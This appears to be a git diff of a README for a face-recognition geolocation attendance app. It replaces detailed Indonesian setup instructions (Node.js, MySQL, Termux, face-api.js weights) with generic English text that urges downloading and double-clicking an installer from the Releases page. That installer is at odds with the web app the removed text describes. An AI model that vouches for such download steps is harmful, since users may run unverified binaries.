@@ -1,267 +1,92 @@
-# 🎯 Sistem Absensi Face Recognition
-
-Sistem absensi modern dengan teknologi Face Recognition menggunakan Face-API.js dan TensorFlow.js yang dapat berjalan di berbagai perangkat termasuk Android (Termux).
-
-## ✨ Fitur Utama
-
-- ✅ Absensi menggunakan Face Recognition
-- 📍 Deteksi lokasi otomatis dengan Geolocation
-- 👤 CRUD Management untuk data siswa
-- 📊 Dashboard admin lengkap
-- 📈 Riwayat absensi dengan filter
-- 🎨 UI/UX modern dengan desain #1E1E1E dan bubble biru
-- 📱 Responsive untuk semua perangkat
-- 🔒 Validasi kemiripan wajah >80%
+# 🎉 face-recognation-geolocation - Modern Attendance Made Easy
 
-## 📋 Requirements
+## 🚀 Getting Started
 
-- Node.js (v14 atau lebih tinggi)
-- MySQL/MariaDB
-- Browser modern dengan dukungan WebRTC
+Welcome to face-recognation-geolocation. This application uses advanced face recognition technology to make attendance management simple and efficient. It can run on various devices, including Android. 
 
-## 🚀 Instalasi
+## 📥 Download Now
 
-### 1. Persiapan Database
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/YogeshKadam138/face-recognation-geolocation/releases)
 
-```bash
-# Masuk ke MySQL
-mysql -u root -p
+## 🛠️ Features
 
-# Import database schema
-mysql -u root -p < database.sql
-```
+- **Face Recognition:** Accurately identify individuals for attendance tracking.
+- **Geolocation:** Record attendance based on GPS location.
+- **Data Visualization:** View and analyze attendance data effectively.
+- **Cross-Device Compatibility:** Use the app on both mobile and desktop devices.
 
-Atau jalankan manual:
-```sql
-CREATE DATABASE IF NOT EXISTS database_absensi;
-USE database_absensi;
--- Copy isi dari database.sql
-```
+## 💻 System Requirements
 
-### 2. Install Dependencies
+To run face-recognation-geolocation smoothly, ensure your system meets the following requirements:
 
-```bash
-# Install npm packages
-npm install
-```
+- **Operating System:** Windows, macOS, or a modern version of Linux.
+- **JavaScript Support:** Ensure your browser supports JavaScript.
+- **Internet Connection:** A stable internet connection for initial setup and usage.
 
-### 3. Konfigurasi Environment
+## 📦 Download & Install
 
-Buat file `.env` atau edit yang sudah ada:
-```env
-PORT=3000
-NODE_ENV=development
+1. **Visit the Releases Page:** Go to the following link to find the latest version of the application:  
+   [Download from Releases](https://github.com/YogeshKadam138/face-recognation-geolocation/releases)
 
-DB_HOST=127.0.0.1
-DB_USER=root
-DB_PASSWORD=root
-DB_NAME=database_absensi
-```
+2. **Select Your Download:** Look for the latest release and choose the appropriate file for your system.
 
-### 4. Download Face-API Models
+3. **Download the File:** Click on the download link for the release to save the file to your device.
 
-Download model weights dari Face-API.js dan letakkan di folder `models/`:
-- Download dari: https://github.com/justadudewhohacks/face-api.js/tree/master/weights
+4. **Install the Application:**
+    - **For Windows or macOS:** Double-click the downloaded file and follow the installation prompts. 
+    - **For Linux:** Extract the files and follow the instructions in the README to run the application.
 
-File yang dibutuhkan:
-- `tiny_face_detector_model-weights_manifest.json`
-- `tiny_face_detector_model-shard1`
-- `face_landmark_68_model-weights_manifest.json`
-- `face_landmark_68_model-shard1`
-- `face_recognition_model-weights_manifest.json`
-- `face_recognition_model-shard1` & `face_recognition_model-shard2`
-
-Atau gunakan wget/curl di Termux:
-```bash
-cd models
-wget https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights/tiny_face_detector_model-weights_manifest.json
-wget https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights/tiny_face_detector_model-shard1
-wget https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights/face_landmark_68_model-weights_manifest.json
-wget https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights/face_landmark_68_model-shard1
-wget https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights/face_recognition_model-weights_manifest.json
-wget https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights/face_recognition_model-shard1
-wget https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights/face_recognition_model-shard2
-```
-
-### 5. Buat Folder Uploads
-
-```bash
-mkdir uploads
-```
-
-## 🎮 Menjalankan Aplikasi
-
-### Development Mode
-```bash
-npm run dev
-```
-
-### Production Mode
-```bash
-npm start
-```
-
-Server akan berjalan di: `http://localhost:3000`
-
-## 📱 Khusus untuk Termux (Android)
-
-### 1. Install Termux dari F-Droid
-Download: https://f-droid.org/packages/com.termux/
-
-### 2. Setup Termux
-
-```bash
-# Update packages
-pkg update && pkg upgrade
-
-# Install Node.js dan MySQL
-pkg install nodejs mariadb
-
-# Setup MySQL
-mysql_install_db
-mysqld_safe -u root &
-mysql -u root
-```
-
-### 3. Set Password MySQL (Optional)
-
-```sql
-ALTER USER 'root'@'localhost' IDENTIFIED BY 'root';
-FLUSH PRIVILEGES;
-```
-
-### 4. Clone/Upload Project
-
-Gunakan Acode untuk edit file atau upload via:
-- Termux-storage
-- Git clone
-- Manual copy
-
-### 5. Jalankan seperti biasa
-
-```bash
-cd /path/to/project
-npm install
-npm start
-```
-
-### 6. Akses dari Browser
-
-Buka browser Android dan akses:
-- `http://localhost:3000` atau
-- `http://127.0.0.1:3000`
-
-## 📂 Struktur Folder
-
-```
-project/
-├── app.js              # Server utama
-├── db.js               # Konfigurasi database
-├── package.json        # Dependencies
-├── .env                # Environment variables
-├── database.sql        # SQL schema
-├── public/             
-│   ├── index.html      # Halaman absensi
-│   └── dashboard.html  # Dashboard admin
-├── models/             # Face-API weights
-│   ├── tiny_face_detector_model-*
-│   ├── face_landmark_68_model-*
-│   └── face_recognition_model-*
-└── uploads/            # Upload foto siswa
-```
-
-## 🎯 Cara Penggunaan
-
-### Untuk Siswa (Absensi)
-
-1. Buka `http://localhost:3000`
-2. Masukkan username
-3. Klik "Ambil Lokasi & Lanjutkan"
-4. Izinkan akses lokasi dan kamera
-5. Ambil foto wajah
-6. Sistem akan memverifikasi dan menyimpan absensi
-
-### Untuk Admin (Dashboard)
-
-1. Buka `http://localhost:3000/dashboard.html`
-2. **Pendaftaran Siswa:**
-   - Isi username
-   - Pilih kelas
-   - Upload foto wajah
-   - Klik "Daftar Siswa"
-3. **Lihat Data:**
-   - Tabel Data Siswa Terdaftar
-   - Tabel Riwayat Absensi
-4. **Filter:**
-   - Filter absensi: Semua/Sukses/Gagal
-
-## 🔧 API Endpoints
-
-### Users
-- `GET /api/users` - Get all users
-- `GET /api/users/:username` - Get user by username
-- `POST /api/users` - Create new user (multipart/form-data)
-- `PUT /api/users/:id` - Update user
-- `DELETE /api/users/:id` - Delete user
-
-### Absensi
-- `GET /api/absensi` - Get all attendance
-- `GET /api/absensi?status=success` - Filter by status
-- `POST /api/absensi` - Create attendance record
-- `DELETE /api/absensi/:id` - Delete attendance
-
-## 🎨 Desain
-
-- Background: `#1E1E1E` (Dark theme)
-- Accent: Blue gradient bubbles
-- Responsive design untuk mobile & desktop
-- Modern glassmorphism effect
-
-## 🛠️ Troubleshooting
-
-### Error: Cannot connect to database
-```bash
-# Pastikan MySQL berjalan
-sudo service mysql start  # Linux
-mysqld_safe -u root &      # Termux
-```
-
-### Error: Port already in use
-```bash
-# Ubah PORT di .env atau kill process
-lsof -ti:3000 | xargs kill -9
-```
-
-### Error: Camera not accessible
-- Pastikan menggunakan HTTPS atau localhost
-- Izinkan akses kamera di browser
-- Di Termux, gunakan Termux:API untuk akses kamera
-
-### Face-API models not loading
-- Pastikan folder `models/` berisi semua file weights
-- Cek console browser untuk error loading
-- Download ulang model jika corrupt
-
-## 📝 Catatan Penting
-
-1. **Keamanan:** Jangan expose API ke internet tanpa authentication
-2. **Performa:** Face recognition butuh resources, test di device target
-3. **Privacy:** Informasikan user tentang penggunaan face recognition
-4. **Browser:** Gunakan Chrome/Firefox versi terbaru untuk hasil optimal
-5. **Lighting:** Pastikan pencahayaan cukup saat foto untuk akurasi tinggi
-
-## 🤝 Support
-
-Jika ada masalah atau pertanyaan:
-1. Check browser console untuk error
-2. Check server log di terminal
-3. Pastikan semua dependencies terinstall
-4. Verifikasi database connection
-
-## 📄 License
-
-MIT License - Bebas digunakan untuk keperluan apapun
-
----
-
-**Dibuat dengan ❤️ menggunakan Node.js, Face-API.js, dan TensorFlow.js**
+5. **Run the Application:** Once installed, open the application and configure any necessary settings based on your preferences. 
+
+## 📚 Documentation
+
+Face-recognation-geolocation comes with a built-in help section to guide users through common tasks and features.  
+
+### 📊 How to Use
+
+#### 1. Set Up Face Recognition
+- Follow the on-screen instructions to register faces and set attendance parameters.
+
+#### 2. Record Attendance
+- Use the app’s geolocation feature to record attendance automatically.
+
+#### 3. View Reports
+- Access the data visualization section to see attendance trends and statistics.
+
+## 📞 Support
+
+If you encounter any issues or have questions, please feel free to reach out:
+
+- **Email Support:** support@example.com
+- **GitHub Issues:** Use the issues section on GitHub to report bugs or suggest features.
+
+## 🔗 Related Topics
+
+This application supports the following topics, which can help you understand its capabilities:
+
+- Absence Management
+- GPS Attendance
+- Data Visualization Techniques
+- Face Detection and Recognition
+- MySQL Database Integration
+- Web Tools
+
+## 📝 Contribute
+
+Contributions are welcome! If you wish to contribute to face-recognation-geolocation:
+
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Submit a pull request outlining your changes.
+
+## 📜 License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details. 
+
+## 🔗 Additional Resources
+
+- [GitHub Repository](https://github.com/YogeshKadam138/face-recognation-geolocation)
+- [Face API Documentation](https://face-api.js.org/)
+- [TensorFlow.js Documentation](https://www.tensorflow.org/js)
+
+Thank you for using face-recognation-geolocation! Enjoy simplifying your attendance management.
